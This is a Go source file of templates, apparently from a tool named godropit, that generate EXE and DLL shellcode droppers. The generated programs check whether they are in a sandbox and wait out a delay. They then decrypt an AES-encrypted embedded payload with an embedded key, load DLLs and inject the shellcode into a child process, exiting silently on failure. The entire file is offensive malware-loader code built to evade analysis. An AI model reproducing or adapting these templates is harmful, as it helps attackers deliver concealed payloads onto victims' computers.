package godroplib

/*

Contains templates for all godropit definitions.

*/

const ShellcodeExeMain = `
package main

{{.C}}

import (
	{{.Import}}
	{{.BoxChkImp}}

)
var hope = "{{.Domain}}"

{{.BoxChkFunc}}

{{.ProcAttach}}

func init() {
	{{.ChkBox}}	
}

func main() {

	{{.ExecFunc}}()
}

func {{.ExecFunc}}() {

	program := "{{.ChildProc}}"
	args := "{{.Args}}"

	bufstring := "{{.BufStr}}"
	kstring := "{{.KeyStr}}"
	time.Sleep({{.Delay}}* time.Second)

	shellcode, err := box.AESDecrypt(kstring, bufstring)
	if err != nil {
		time.Sleep({{.Delay}}* time.Second)
		os.Exit(0)
	}
	{{.Dlls}}
	{{.Inject}}
}
`

const ShellcodeDllMain = `
package main

{{.C}}

import (
	{{.Import}}

	{{.BoxChkImp}}

)
var hope = "{{.Domain}}"

{{.BoxChkFunc}}

{{.ProcAttach}}

func init() {
	{{.ChkBox}}	
	{{.Init}}
}
func main() {

	{{.ExecFuncName}}()

}

//{{.Export}} {{.ExecFuncName}}
func {{.ExecFuncName}}() {

	program := "{{.ChildProc}}"
	args := "{{.Args}}"

	bufstring := "{{.BufStr}}"
	kstring := "{{.KeyStr}}"
	time.Sleep({{.Delay}}* time.Second)

	shellcode, err := box.AESDecrypt(kstring, bufstring)
	if err != nil {
		time.Sleep({{.Delay}}* time.Second)
		os.Exit(0)
	}
	{{.Dlls}}
	{{.Inject}}
}
`
